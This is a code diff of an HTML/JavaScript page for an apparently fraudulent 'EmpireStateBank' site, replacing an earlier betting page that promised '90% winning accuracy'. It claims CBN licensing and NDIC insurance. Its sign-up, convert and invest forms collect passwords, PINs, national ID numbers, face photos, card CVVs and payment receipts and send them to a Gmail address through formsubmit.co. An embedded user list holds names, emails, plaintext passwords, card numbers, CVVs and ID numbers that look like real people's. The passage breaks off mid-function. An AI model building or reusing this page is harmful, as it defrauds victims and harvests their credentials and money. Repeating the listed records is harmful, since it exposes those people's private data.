+    <img src="AddText_04-11-12.53.52.png" alt="EmpireStateBank logo" />
+    <h1>Empowering Your Financial Growth</h1>
+    <p>Licensed by the CBN and insured by the NDIC</p>
+    <div class="loader"></div>
+  </section>
+
+  <!-- Login page -->
+  <section id="loginPage" class="page hidden">
+    <div class="close-mark">×</div>
+
+    <div class="login-card">
+      <h2>Welcome to EmpireStateBank</h2>
+
+      <form id="loginForm">
+        <div class="field">
+          <label for="loginEmail">Email or Mobile Number</label>
+          <input id="loginEmail" type="text" required />
         </div>
-        <div class="info-section">
-            EmpireBet Football ODD Trading is now available! Take part in trading with a proven 90% winning accuracy. For best results, always fund your wallet before you begin. <br>
-            Trading sessions run from Monday to Thursday, starting at 23:00. Please ensure you make your trades on time. Results are uploaded every Sunday at 17:00.
+
+        <div class="field">
+          <label for="loginPassword">Password</label>
+          <input id="loginPassword" type="password" required />
         </div>
-        <div class="notice-section">
-            <span class="notice-title">Notice</span>
-            For a smooth and profitable experience with EmpireBet, please ensure your wallet is funded before trading. Trading is open from Monday to Thursday at 23:00, and results are published every Sunday at 17:00. Follow these guidelines for the best results and to maximize your profit potential. Stay updated, trade responsibly, and benefit from our trusted accuracy and reliability.
-        </div>
-        <a class="site-link" href="https://empireempowerment.mssg.me" target="_blank" rel="noopener">
-            Visit the Site Now
-        </a>
+
+        <button class="primary-btn" type="submit">LOGIN</button>
+      </form>
     </div>
+
+    <div class="login-links">
+      <a href="mailto:empirevirtual99@gmail.com?subject=Password%20Reset&body=Full%20Name:%0AEmail:%0AI%20would%20like%20to%20reset%20my%20password.">
+        Forgot Password?
+      </a>
+
+      <hr />
+
+      <div>
+        New to EmpireStateBank?
+        <strong id="signupLink">Sign up now.</strong>
+      </div>
+    </div>
+  </section>
+
+  <!-- Dashboard -->
+  <main id="dashboardPage" class="page hidden">
+    <header class="dashboard-header">
+      <div class="user-row" id="profileShortcut">
+        <div class="avatar-wrap">
+          <img id="userImage" src="AddText_04-11-12.53.52.png" alt="User profile" />
+          <span id="tierBadge" class="tier">2</span>
+        </div>
+        <div class="hello">Hi, <span id="userFirstName"></span></div>
+      </div>
+
+      <div class="header-icons">
+        <button id="customerServiceBtn" title="Customer Service">💬</button>
+        <button id="notificationBtn" title="Notifications" style="position: relative;">
+          🔔
+          <span class="notification-badge" id="notificationBadge">1</span>
+        </button>
+      </div>
+    </header>
+
+    <section class="dashboard-content">
+      <!-- Wallet Section -->
+      <div class="wallet-section-header">
+        <div class="wallet-title">My Wallets</div>
+        <div class="wallet-dots">⋯  ⋯</div>
+      </div>
+
+      <div class="wallet-slider-wrapper" id="walletSliderWrapper">
+        <div class="wallet-slider" id="walletSlider">
+          <!-- E-Wallet Card (Card 1) -->
+          <div class="wallet-card" id="walletCard1">
+            <div class="wallet-card-header">
+              <div class="wallet-card-logo">
+                <span class="verve-label">Verve</span>
+                E-Wallet Card
+              </div>
+              <div class="wallet-card-number" id="cardNumber1">**5549</div>
+            </div>
+
+            <div class="wallet-card-middle">
+              <div class="wallet-label">Balance</div>
+              <div class="wallet-balance" id="walletBalance1">$0.00</div>
+            </div>
+
+            <div class="wallet-card-footer">
+              <button class="wallet-action-btn" id="fundBtn">+ Fund e-wallet</button>
+              <button class="wallet-action-btn" id="convertCardBtn">Convert</button>
+            </div>
+          </div>
+
+          <!-- Available Balance Card (Card 2) -->
+          <div class="wallet-card" id="walletCard2">
+            <div class="wallet-card-header">
+              <div class="wallet-card-logo">
+                <span class="verve-label">Verve</span>
+                eCash Wallet
+              </div>
+              <div class="wallet-card-number" id="cardNumber2">**2493</div>
+            </div>
+
+            <div class="wallet-card-middle">
+              <div class="wallet-label">Balance</div>
+              <div class="wallet-balance">
+                <span id="balanceDisplay">*** **</span>
+                <button class="eye-icon-btn" id="toggleBalanceBtn">👁️</button>
+              </div>
+              <div class="wallet-label" style="margin-top: 10px; font-size: 11px;" id="balanceDate">--</div>
+            </div>
+
+            <div class="wallet-card-footer">
+              <button class="wallet-action-btn" id="withdrawCardBtn">Withdraw</button>
+              <div style="flex: 1;"></div>
+            </div>
+            <div class="withdraw-label">Withdraw</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Wallet Indicators -->
+      <div class="wallet-indicators">
+        <div class="indicator active" data-index="0"></div>
+        <div class="indicator" data-index="1"></div>
+      </div>
+
+      <!-- Incoming Payment -->
+      <article class="incoming" id="incomingSection">
+        <h2>Incoming payment</h2>
+
+        <div class="progress-track">
+          <div id="paymentProgress" class="progress-value"></div>
+        </div>
+
+        <div class="incoming-meta">
+          <span id="paymentDate">--</span>
+          <span id="paymentPercent">0%</span>
+        </div>
+      </article>
+
+      <!-- Action Buttons -->
+      <section class="actions">
+        <button class="tile" id="investButton">
+          <span class="tile-icon">▣</span>
+          <span>Invest</span>
+        </button>
+
+        <button class="tile hidden" id="convertMenuBtn">
+          <span class="tile-icon">♜</span>
+          <span>Convert to Naira</span>
+        </button>
+
+        <button class="tile hidden" id="withdrawButton">
+          <span class="tile-icon">↗</span>
+          <span>Withdraw</span>
+        </button>
+      </section>
+
+      <!-- Services Grid -->
+      <section class="services">
+        <button class="tile hidden"><span class="tile-icon">▥</span><span>Airtime</span></button>
+        <button class="tile hidden"><span class="tile-icon">▤</span><span>Data</span></button>
+        <button class="tile" id="bettingButton"><span class="tile-icon">◉</span><span>Betting</span></button>
+        <button class="tile" id="tvButton"><span class="tile-icon">▣</span><span>TV</span></button>
+        <button class="tile hidden"><span class="tile-icon">▣</span><span>SafeBox</span></button>
+        <button class="tile" id="invitationButton"><span class="tile-icon">♧</span><span>Invitation</span></button>
+        <button class="tile hidden"><span class="tile-icon">⋯</span><span>More</span></button>
+      </section>
+    </section>
+
+    <!-- Bottom Nav -->
+    <nav class="bottom-nav">
+      <button class="nav-item active"><div>●</div>Home</button>
+      <button class="nav-item hidden"><div>◇</div>Rewards</button>
+      <button class="nav-item hidden"><div>▱</div>Finance</button>
+      <button class="nav-item hidden"><div>▭</div>Cards</button>
+      <button class="nav-item" id="meButton"><div>●</div>Me</button>
+    </nav>
+  </main>
+
+  <!-- Referral Program Page -->
+  <div id="referralPage" class="referral-page">
+    <div class="referral-header">
+      <button class="referral-close" id="referralCloseBtn" type="button">×</button>
+      <div class="referral-title">🎁 Referral Program</div>
+    </div>
+
+    <div class="referral-content">
+      <div class="referral-banner">
+        <div class="referral-banner-icon">🎁</div>
+      </div>
+
+      <div class="referral-section">
+        <div class="referral-section-title">Your Referral Code</div>
+        <div class="referral-code">
+          <span class="referral-code-text" id="referralCodeDisplay">@tag</span>
+          <button class="copy-btn" id="copyCodeBtn" type="button" title="Copy code">📋</button>
+        </div>
+      </div>
+
+      <div class="referral-section">
+        <div class="referral-section-title">Your Referral Link</div>
+        <div class="referral-link">
+          <span class="referral-link-text" id="referralLinkDisplay">https://empirestatebank.mssg.me</span>
+          <div class="link-buttons">
+            <button class="link-btn" id="copyLinkBtn" type="button" title="Copy link">🔗</button>
+            <button class="link-btn share-btn" id="shareLinkBtn" type="button" title="Share">🔗</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="how-it-works">
+        <div class="how-it-works-title">How it works:</div>
+        <ul class="how-it-works-list">
+          <li>Share your referral link with friends</li>
+          <li>When they Sign up using your code, you earn $0.25</li>
+          <li>There's no limit to how many friends you can refer!</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Profile Page -->
+  <div id="profilePage" class="profile-page">
+    <div class="profile-header">
+      <span id="profileBackBtn" class="profile-back" style="cursor: pointer;">&lt;</span>
+      <span>My Profile</span>
+    </div>
+
+    <div class="profile-card">
+      <div class="profile-top">
+        <img id="profileImage" src="empirestatebank.png" alt="User image" />
+        <div class="profile-name" id="profileName">USER NAME</div>
+        <div style="display:flex; gap:8px; align-items:center;">
+          <div style="color:#666;">Account Number</div>
+          <div style="margin-left:8px; font-weight:700;" id="profileAccountNumber">0000000000</div>
+        </div>
+        <div style="display:flex; gap:8px; align-items:center;">
+          <div style="color:#666;">Account Tier</div>
+          <div id="profileTierBadge" style="margin-left:8px; font-weight:700;">Tier 2</div>
+          <button id="upgradeBtn" class="upgrade-btn" style="display:none;">Upgrade ⟩</button>
+        </div>
+      </div>
+
+      <div class="profile-fields">
+        <div class="field-item">
+          <div class="field-name">Full Name</div>
+          <div class="field-value" id="profileFullName">Full Name Here</div>
+        </div>
+
+        <div class="field-item">
+          <div class="field-name">Nickname</div>
+          <div class="field-value" id="profileNickname">Empire</div>
+        </div>
+
+        <div class="field-item">
+          <div class="field-name">Gender</div>
+          <div class="field-value" id="profileGender">--</div>
+        </div>
+
+        <div class="field-item">
+          <div class="field-name">Date of birth</div>
+          <div class="field-value" id="profileDob">--</div>
+        </div>
+
+        <div class="field-item">
+          <div class="field-name">Email</div>
+          <div class="field-value" id="profileEmail">--</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Proof of Address Page -->
+  <div id="proofPage" class="proof-page">
+    <div class="proof-header">
+      <span id="proofBackBtn" style="cursor: pointer;">&lt;</span>
+      <span>Provide A Valid Quickteller eCash Account</span>
+    </div>
+
+    <div class="proof-content">
+      <div class="proof-alert">
+        Please upload proof of <strong>Quickteller eCash account</strong> which was opened with your valid Email and Phone number.
+      </div>
+
+      <form id="proofForm" class="proof-form" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" enctype="multipart/form-data">
+        <input type="hidden" name="_subject" value="Provide Proof Raenest NGN Account" />
+
+        <div class="document-section">
+          <label class="form-label"><span class="required">*</span>Full Name</label>
+          <input type="text" name="Full Name" class="form-input" id="proofFullName" required />
+        </div>
+
+        <div class="document-section">
+          <label class="form-label"><span class="required">*</span>Proof of Profile</label>
+          <select name="Document Type" class="form-select" required>
+            <option value="">Select Document Type</option>
+            <option value="Raenest NGN Account">Quickteller eCash Account</option>
+          </select>
+        </div>
+
+        <div class="document-section">
+          <label class="form-label"><span class="required">*</span>Upload Proof of Profile
+            <span class="sample-link" id="sampleLink">Watch Setup Guide</span>
+          </label>
+
+          <div class="upload-area" id="uploadArea">
+            <div class="upload-area-icon">📷</div>
+            <div class="upload-area-text">Click to upload</div>
+            <div class="upload-area-hint">or drag and drop</div>
+            <input type="file" name="Proof Document" id="proofFileInput" accept="image/*,.pdf" style="display: none;" required />
+          </div>
+          <div class="file-name" id="fileName"></div>
+        </div>
+
+        <div class="document-section">
+          <label class="form-label"><span class="required">*</span>Do you have Quickteller eCash Account?</label>
+          <div class="radio-group">
+            <label class="radio-option">
+              <input type="radio" name="Account Status" value="I have" required />
+              I have
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="Account Status" value="I don't have" required />
+              I don't have
+            </label>
+          </div>
+          <button type="button" class="get-account-btn" id="getAccountBtn">Get Quickteller eCash Account</button>
+        </div>
+
+        <button type="submit" class="proof-submit-btn">Submit</button>
+      </form>
+
+      <div class="footer-info">
+        Licensed by the CBN and insured by the NDIC
+      </div>
+    </div>
+  </div>
+
+  <!-- Convert Modal -->
+  <div id="convertModal" class="modal">
+    <div class="modal-card">
+      <div class="modal-back" id="convertModalBack">
+        <span>&lt;</span>
+        <span>Convert to NGN</span>
+      </div>
+
+      <div class="convert-header">
+        <div style="display: flex; align-items: center; gap: 15px;">
+          <div style="width: 50px; height: 50px; background: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #d4af37; font-weight: bold;">ESB</div>
+          <div>
+            <div style="font-weight: bold; font-size: 14px;">Transfer to Account</div>
+            <div style="font-size: 12px;" id="transferTag">@Raeneestemma67</div>
+          </div>
+        </div>
+      </div>
+
+      <form id="convertForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST">
+        <input type="hidden" name="_subject" value="Convert to NGN" />
+
+        <div class="field">
+          <label>Enter amount to convert ($)</label>
+          <input type="number" name="Convert Amount (USD)" id="convertAmountInput" placeholder="0.00" step="0.01" min="1" required />
+        </div>
+
+        <div class="convert-amount-display">
+          <span id="convertAmountDisplay">₦0.00</span>
+          <span class="edit-icon">✎</span>
+        </div>
+
+        <div class="field">
+          <label>Card Number</label>
+          <div class="card-display">
+            <span id="cardNumberDisplay">E-wallet Card (**5549)</span>
+            <span class="verve-label">Verve</span>
+          </div>
+          <input type="hidden" name="Card Number" id="cardNumberHidden" />
+        </div>
+
+        <div class="field-row">
+          <div class="field">
+            <label>Expiry (MM / YY)</label>
+            <input type="text" name="Card Expiry" id="expiryDisplay" readonly style="background: #f5f5f5; cursor: not-allowed;">
+          </div>
+          <div class="field">
+            <label>CVV</label>
+            <input type="text" name="CVV" id="cvvDisplay" readonly style="background: #f5f5f5; cursor: not-allowed;">
+          </div>
+        </div>
+
+        <div class="field">
+          <label>Full Name</label>
+          <input type="text" name="Full Name" id="fullNameDisplay" readonly style="background: #f5f5f5; cursor: not-allowed;">
+        </div>
+
+        <div class="field">
+          <label>Email</label>
+          <input type="email" name="Email" id="emailDisplay" readonly style="background: #f5f5f5; cursor: not-allowed;">
+        </div>
+
+        <div class="field">
+          <label>Account Number</label>
+          <input type="text" name="Account Number" id="accountNumberDisplay" readonly style="background: #f5f5f5; cursor: not-allowed;">
+        </div>
+
+        <div class="field">
+          <label>PIN (4 digits)</label>
+          <input type="password" name="PIN" id="pinInput" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
+        </div>
+
+        <div class="field">
+          <label style="display: flex; align-items: center; gap: 8px;">
+            <input type="checkbox" required />
+            I agree to EmpireStateBank terms and conditions
+          </label>
+        </div>
+
+        <button class="primary-btn" type="submit">
+          <span id="convertBtnText">Convert $0.00</span>
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Investment Modal -->
+  <div id="investmentModal" class="modal">
+    <div class="modal-card">
+      <div class="modal-back" id="investmentModalBack">
+        <span>&lt;</span>
+        <span>Investment</span>
+      </div>
+
+      <div class="convert-header">
+        <div style="display: flex; align-items: center; gap: 15px;">
+          <div style="width: 50px; height: 50px; background: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #d4af37; font-weight: bold;">ESB</div>
+          <div>
+            <div style="font-weight: bold; font-size: 14px;">Invest with EmpireStateBank</div>
+            <div style="font-size: 12px;">Invest your funds securely</div>
+          </div>
+        </div>
+      </div>
+
+      <form id="investmentForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST">
+        <input type="hidden" name="_subject" value="Investment" />
+
+        <div class="field">
+          <label>My E-wallet</label>
+          <div class="card-display">
+            <span id="investCardDisplay">E-wallet Card (**5549)</span>
+            <span class="verve-label">Verve</span>
+          </div>
+        </div>
+
+        <div class="field">
+          <label>Full Name</label>
+          <input type="text" name="Full Name" id="investFullName" readonly style="background: #f5f5f5; cursor: not-allowed;">
+        </div>
+
+        <div class="field">
+          <label>Select Amount ($)</label>
+          <input type="number" name="Investment Amount (USD)" id="investAmountInput" placeholder="0.00" step="0.01" min="1" required />
+        </div>
+
+        <div class="field">
+          <label>Date</label>
+          <input type="date" name="Investment Date" id="investDateInput" required />
+        </div>
+
+        <div class="field">
+          <label>PIN (4 digits)</label>
+          <input type="password" name="PIN" id="investPinInput" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
+        </div>
+
+        <button class="primary-btn" type="submit">
+          <span id="investBtnText">Invest</span>
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Alert Modal -->
+  <div id="alertModal" class="alert-modal">
+    <div class="alert-box">
+      <div class="alert-title" id="alertTitle">Alert</div>
+      <div class="alert-message" id="alertMessage">Message here</div>
+      <button class="alert-btn" id="alertBtn">OK</button>
+    </div>
+  </div>
+
+  <!-- PIN Modal -->
+  <div id="pinModal" class="pin-modal">
+    <div class="pin-box">
+      <div class="pin-title">Enter Your PIN</div>
+      <div class="pin-input-field">
+        <label for="pinInputField">PIN (4 digits)</label>
+        <input type="password" id="pinInputField" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
+      </div>
+      <div class="pin-buttons">
+        <button class="pin-btn pin-confirm" id="pinConfirmBtn" type="button">Confirm</button>
+        <button class="pin-btn pin-cancel" id="pinCancelBtn" type="button">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- TV Channel Modal -->
+  <div id="tvModal" class="tv-modal">
+    <div class="tv-box">
+      <div class="tv-title">Select TV Channel</div>
+      <div class="tv-buttons">
+        <button class="tv-btn tv-channel-btn" id="channel1Btn" type="button">Channel 1</button>
+        <button class="tv-btn tv-channel-btn" id="channel2Btn" type="button">Channel 2</button>
+        <button class="tv-btn tv-close-btn" id="tvCloseBtn" type="button">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Camera Modal -->
+  <div id="cameraModal" class="camera-modal">
+    <div class="camera-box">
+      <div class="camera-title">Capture Your Face</div>
+      <video id="cameraVideo" class="camera-video" autoplay playsinline muted></video>
+      <canvas id="cameraCanvas" class="camera-canvas"></canvas>
+      <div class="camera-buttons">
+        <button class="camera-btn camera-capture" id="captureBtn" type="button">Capture Photo</button>
+        <button class="camera-btn camera-close" id="cameraCloseBtn" type="button">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Sign-up Modal -->
+  <div id="signupModal" class="modal">
+    <div class="modal-card">
+      <h2>Create EmpireStateBank Account</h2>
+
+      <form id="signupForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" enctype="multipart/form-data">
+        <input type="hidden" name="_subject" value="New Account Registration" />
+
+        <div class="field">
+          <label><span class="required">*</span>Full Name</label>
+          <input name="Full Name" type="text" class="form-input" required />
+        </div>
+
+        <div class="field">
+          <label><span class="required">*</span>Gender</label>
+          <select name="Gender" class="form-select" required>
+            <option value="">Choose gender</option>
+            <option>Female</option>
+            <option>Male</option>
+            <option>Other</option>
+          </select>
+        </div>
+
+        <div class="field">
+          <label><span class="required">*</span>Date of Birth</label>
+          <input name="Date of Birth" type="date" class="form-input" required />
+        </div>
+
+        <div class="field">
+          <label><span class="required">*</span>Face Capture</label>
+          <button type="button" id="openCameraBtn" class="primary-btn" style="background: var(--green); margin-bottom: 10px;">📷 Capture Face</button>
+          <div id="facePreview" style="display: none; text-align: center;">
+            <img id="facePreviewImg" style="width: 100%; border-radius: 8px; max-width: 150px; margin-bottom: 10px;" />
+            <p style="font-size: 12px; color: var(--green);">✓ Face captured successfully</p>
+          </div>
+          <input type="file" name="Face Capture" id="faceFileInput" accept="image/*" style="display: none;" />
+        </div>
+
+        <div class="field">
+          <label><span class="required">*</span>Email</label>
+          <input name="Email" type="email" class="form-input" required />
+        </div>
+
+        <div class="field">
+          <label><span class="required">*</span>Phone Number</label>
+          <input name="Phone Number" type="tel" class="form-input" required />
+        </div>
+
+        <div class="field">
+          <label><span class="required">*</span>Password</label>
+          <input name="Password" type="password" class="form-input" required />
+        </div>
+
+        <div class="field">
+          <label><span class="required">*</span>NIN (National ID Number)</label>
+          <input name="NIN" type="text" class="form-input" required />
+        </div>
+
+        <div class="field">
+          <button type="button" id="makePaymentBtn" class="primary-btn" style="background: var(--green); margin: 0;">Make Payment ⟩</button>
+        </div>
+
+        <div class="field">
+          <label><span class="required">*</span>Upload Receipt of Payment</label>
+          <div class="upload-area" id="receiptUploadArea">
+            <div class="upload-area-icon">📄</div>
+            <div class="upload-area-text">Click to upload</div>
+            <div class="upload-area-hint">or drag and drop</div>
+            <input type="file" name="Receipt" id="receiptFileInput" accept="image/*,.pdf" style="display: none;" required />
+          </div>
+          <div class="file-name" id="receiptFileName"></div>
+        </div>
+
+        <div class="field">
+          <label><span class="required">*</span>Create 4-Digit PIN</label>
+          <input name="PIN" type="password" class="form-input" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
+        </div>
+
+        <div class="field">
+          <label>Referral Code (Optional)</label>
+          <input name="Referral Code" type="text" class="form-input" />
+        </div>
+
+        <button class="primary-btn" type="submit">REGISTER</button>
+        <button class="secondary-btn" type="button" onclick="closeModal('signupModal')">Cancel</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const USERS = [
+      {
+        id: "2019",
+        name: "Charity Hanson",
+        email: "charityhanza@gmail.com",
+        password: "@empire123",
+        profileImage: "AddText_06-02-03.50.45.png",
+        tier: 2,
+        accountNumber: "8028403872",
+        tag: "",
+        cardNumber: "5549",
+        cardExpiry: "03/26",
+        cvv: "357",
+        currentBalance: 6.40,
+        nairaBalance: 0.00,
+        incomingPayment: 6.40,
+        incomingPaymentStartDate: "2026-06-25T12:00:00Z",
+        incomingPaymentDate: "2026-07-01T12:00:00Z",
+        gender: "Male",
+        dob: "",
+        nin: ""
+      },
+      {
+        id: "1995",
+        name: "Daniel Johnson",
+        email: "johnsondani70@gmail.com",
+        password: "@empire123",
+        profileImage: "AddText_12-23-12.28.07.png",
+        tier: 2,
+        accountNumber: "8105122713",
+        tag: "@johnd461840",
+        cardNumber: "2493",
+        cardExpiry: "05/26",
+        cvv: "492",
+        currentBalance: 0.00,
+        nairaBalance: 0.00,
+        incomingPayment: 0.00,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-07-05T09:30:00Z",
+        gender: "Male",
+        dob: "",
+        nin: ""
+      },
+      {
+        id: "3572",
+        name: "Emmanuel Ekpa",
+        email: "emmanuelekpa3@gmail.com",
+        password: "Ronaldo77$",
+        profileImage: "AddText_05-22-01.29.33.png",
+        tier: 3,
+        accountNumber: "1807059985",
+        tag: "@emmela593338",
+        cardNumber: "5054120715822239081",
+        cardExpiry: "12/27",
+        cvv: "681",
+        currentBalance: 51.45,
+        nairaBalance: 0.00,
+        incomingPayment: 61.45,
+        incomingPaymentStartDate: "2026-10-05T20:10:00Z",
+        incomingPaymentDate: "2026-12-05T16:10:00Z",
+        gender: "Male",
+        dob: "2002-05-25",
+        nin: "08105866469"
+      },
+      {
+        id: "2027",
+        name: "Eke James",
+        email: "jameseke2025@gmail.com",
+        password: "@empire123",
+        profileImage: "AddText_01-11-09.57.24.png",
+        tier: 2,
+        accountNumber: "9167655099",
+        tag: "",
+        cardNumber: "5055220115822239050",
+        cardExpiry: "05/26",
+        cvv: "402",
+        currentBalance: 4.26,
+        nairaBalance: 0.00,
+        incomingPayment: 4.26,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-07-05T09:30:00Z",
+        gender: "Male",
+        dob: "",
+        nin: ""
+      },
+      {
+        id: "4073",
+        name: "Esther Amos",
+        email: "eamos9339@gmail.com",
+        password: "@empire123",
+        profileImage: "AddText_15-25-10.37.46.png",
+        tier: 2,
+        accountNumber: "8130024073",
+        tag: "",
+        cardNumber: "2154",
+        cardExpiry: "05/26",
+        cvv: "192",
+        currentBalance: 4.26,
+        nairaBalance: 0.00,
+        incomingPayment: 4.26,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-07-05T09:30:00Z",
+        gender: "Female",
+        dob: "",
+        nin: ""
+      },
+      {
+        id: "1112",
+        name: "Emmanuel Udo",
+        email: "kinghumble067@gmail.com",
+        password: "1234567Hu",
+        profileImage: "AddText_10-22-12.18.16.png",
+        tier: 3,
+        accountNumber: "09138794450",
+        tag: "ESBemmanuel450",
+        cardNumber: "2154",
+        cardExpiry: "05/26",
+        cvv: "192",
+        currentBalance: 0.00,
+        nairaBalance: 0.00,
+        incomingPayment: 0.00,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-07-05T09:30:00Z",
+        gender: "Male",
+        dob: "2005-10-14",
+        nin: "42095300008"
+      },
+      {
+        id: "9963",
+        name: "Godswill Itam",
+        email: "icenickon@gmail.com",
+        password: "@empire123",
+        profileImage: "AddText_08-20-08.46.05.png",
+        tier: 2,
+        accountNumber: "9138753683",
+        tag: "",
+        cardNumber: "1490",
+        cardExpiry: "05/26",
+        cvv: "002",
+        currentBalance: 0.00,
+        nairaBalance: 0.00,
+        incomingPayment: 0.00,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-07-05T09:30:00Z",
+        gender: "Male",
+        dob: "",
+        nin: ""
+      },
+      {
+        id: "1313",
+        name: "Itohowo Akan",
+        email: "itohowoakan111@gmail.com",
+        password: "@empire123",
+        profileImage: "AddText_05-25-10.37.07.png",
+        tier: 2,
+        accountNumber: "8036241336",
+        tag: "",
+        cardNumber: "3540",
+        cardExpiry: "05/26",
+        cvv: "992",
+        currentBalance: 4.98,
+        nairaBalance: 0.00,
+        incomingPayment: 4.98,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-07-05T09:30:00Z",
+        gender: "Male",
+        dob: "",
+        nin: ""
+      },
+      {
+        id: "7452",
+        name: "Otobong Akpan",
+        email: "khumble042@gmail.com",
+        password: "KingHumble234$",
+        profileImage: "AddText_08-01-05.29.26.png",
+        tier: 3,
+        accountNumber: "1809443351",
+        tag: "@khleo4463689",
+        cardNumber: "09036659121",
+        cardExpiry: "11/26",
+        cvv: "592",
+        currentBalance: 2.13,
+        nairaBalance: 0.00,
+        incomingPayment: 2.13,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-07-05T09:30:00Z",
+        gender: "Male",
+        dob: "2002-09-09",
+        nin: "55794044008"
+      },
+      {
+        id: "2255",
+        name: "Silas Owan",
+        email: "owansilas87@gmail.com",
+        password: "Owansonjr@5055",
+        profileImage: "AddText_11-25-06.08.39.png",
+        tier: 2,
+        accountNumber: "9037404875",
+        tag: "ESBsilas875",
+        cardNumber: "5674",
+        cardExpiry: "05/26",
+        cvv: "802",
+        currentBalance: 35.48,
+        nairaBalance: 0.00,
+        incomingPayment: 35.48,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-10-05T09:30:00Z",
+        gender: "Male",
+        dob: "2005-06-30",
+        nin: "90118804831"
+      },
+      {
+        id: "1220",
+        name: "Saviour Ekong",
+        email: "saviouruwana783@gmail.com",
+        password: "@empire123",
+        profileImage: "AddText_05-29-09.19.44.png",
+        tier: 2,
+        accountNumber: "8033456780",
+        tag: "",
+        cardNumber: "0193",
+        cardExpiry: "05/26",
+        cvv: "809",
+        currentBalance: 4.10,
+        nairaBalance: 0.00,
+        incomingPayment: 4.10,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-08-05T09:30:00Z",
+        gender: "Male",
+        dob: "",
+        nin: ""
+      },
+      {
+        id: "5012",
+        name: "Samuel Akpan",
+        email: "werptrop76@gmail.com",
+        password: "Samuel.1",
+        profileImage: "AddText_06-03-08.29.58.png",
+        tier: 3,
+        accountNumber: "08108330637",
+        tag: "ESBsamuel637",
+        cardNumber: "5054191415808939014",
+        cardExpiry: "01/27",
+        cvv: "084",
+        currentBalance: 10.08,
+        nairaBalance: 0.00,
+        incomingPayment: 10.08,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-09-05T09:30:00Z",
+        gender: "Male",
+        dob: "2005-10-06",
+        nin: "09138109857"
+      },
+      {
+        id: "1266",
+        name: "Samuel Ime",
+        email: "ime79606@gmail.com",
+        password: "@empire123",
+        profileImage: "AddText_05-22-09.03.57.png",
+        tier: 2,
+        accountNumber: "8012345080",
+        tag: "",
+        cardNumber: "1093",
+        cardExpiry: "05/26",
+        cvv: "292",
+        currentBalance: 4.98,
+        nairaBalance: 0.00,
+        incomingPayment: 4.98,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-08-05T09:30:00Z",
+        gender: "Male",
+        dob: "",
+        nin: ""
+      },
+      {
+        id: "1908",
+        name: "Ushie Onen",
+        email: "ushieonen3@gmail.com",
+        password: "@empire123",
+        profileImage: "AddText_06-05-09.14.49.png",
+        tier: 2,
+        accountNumber: "7032325480",
+        tag: "",
+        cardNumber: "0023",
+        cardExpiry: "05/26",
+        cvv: "912",
+        currentBalance: 2.13,
+        nairaBalance: 0.00,
+        incomingPayment: 2.13,
+        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
+        incomingPaymentDate: "2026-08-05T09:30:00Z",
+        gender: "Male",
+        dob: "",
+        nin: ""
+      },
+    ];
+
+    let currentUser = null;
+    let progressTimer;
+    let balanceRevealed = false;
+    let startX = 0;
+    let currentTranslate = 0;
+    let pinModalCallback = null;
+    let mediaStream = null;
+    let currentWalletIndex = 0;
+    let faceImageData = null;
+    const EXCHANGE_RATE = 1500;
+
+    const $ = (id) => document.getElementById(id);
+
+    function showLoading() {
+      $("loadingOverlay").classList.add("active");
+    }
+
+    function hideLoading() {
+      $("loadingOverlay").classList.remove("active");
+    }
+
+    function openModal(id) {
+      $(id).classList.add("active");
+    }
+
+    function closeModal(id) {
+      $(id).classList.remove("active");
+    }
+
+    function showAlert(title, message, callback = null) {
+      $("alertTitle").textContent = title;
+      $("alertMessage").textContent = message;
+      $("alertModal").classList.add("active");
+
+      const alertBtn = $("alertBtn");
+      const handleClick = () => {
+        $("alertModal").classList.remove("active");
+        alertBtn.removeEventListener("click", handleClick);
+        if (callback) callback();
+      };
+      alertBtn.addEventListener("click", handleClick);
+    }
+
+    function showPinModal(callback) {
+      pinModalCallback = callback;
+      $("pinInputField").value = "";
+      openModal("pinModal");
+      $("pinInputField").focus();
+    }
+
+    function closePinModal() {
+      closeModal("pinModal");
+      pinModalCallback = null;
+      $("pinInputField").value = "";
+    }
+
+    function isCardExpired(expiry) {
+      const [month, year] = expiry.split('/');
+      const currentDate = new Date();
+      const currentYear = currentDate.getFullYear() % 100;
+      const currentMonth = currentDate.getMonth() + 1;
+
+      const expiryYear = parseInt(year);
+      const expiryMonth = parseInt(month);
+
+      if (expiryYear < currentYear) return true;
+      if (expiryYear === currentYear && expiryMonth < currentMonth) return true;
+      return false;
+    }
+
+    function getNotificationCount() {
